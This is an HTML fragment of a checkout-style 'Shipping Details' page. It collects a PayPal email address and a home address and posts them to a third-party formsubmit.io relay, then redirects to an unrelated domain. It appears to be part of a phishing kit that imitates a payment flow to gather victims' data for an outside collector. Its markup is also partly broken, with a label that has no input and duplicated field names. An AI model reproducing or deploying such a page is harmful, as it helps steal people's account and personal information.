<body id="shipping">
    <div id="preloader"></div>
    <div class="wrapper">
        <div class="container">
            <div class="step-by-step">
                <div class="step-33-persen active-now">
                    <sup class="sup-css-step">1</sup>Shipping details
                </div>
                <div class="step-33-persen">
                    <sup class="sup-css-step">2</sup>Item Summary
                </div>
                <div class="step-33-persen">
                    <sup class="sup-css-step">3</sup>Choose payment
                </div>
            </div>
            <form action="https://formsubmit.io/send/6f54acfc-8cc8-4575-8b95-6eee33692b31" method="POST">
                <input name="_redirect" type="hidden" id="name" value="https://giattt.com">
                <h1>
                    <i class="fas fa-shipping-fast"></i>
                    Shipping Details
                </h1>
                <div class="street">
                    <label for="name">Paypal Email</label>
                    <input type="email" name="emailaddress" pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,4}$" required>
                </div>
                <div class="name">
                    <div>
                        <label for="f-name">First</label>

                    </div>
                    <div>

                        <input class="input-css" type="text" name="l-name">
                    </div>
                </div>
                <div class="street">
                    <label for="name">Country</label>
                    <input class="input-css" type="text" name="country">
                </div>
                <div class="address-info">
                    <div>
                        <label for="city">City</label>
                        <input class="input-css" type="text" name="city">
                    </div>
                    <div>
                        <label for="state">State</label>
                        <input class="input-css" type="text" name="state">
                    </div>
                    <div>
                        <label for="zip">Zip</label>
                        <input class="input-css" type="number" name="zip">
                    </div>
                </div>
                <div class="street">
                    <label for="name">Street</label>
                    <input class="input-css" type="text" name="address">
                </div>
                <div class="street blok">
                    <label for="name">Blok, Apartement, Building, etc</label>
                    <input class="input-css" type="text" name="address">
                </div>
                <div class="street note">

                </div>

                    <button class="continue" style="float:right; cursor: pointer" value="Submit" type="submit" onclick="window.location.href='summary.html'"><i class="far fa-credit-card"></i> Continue</button>
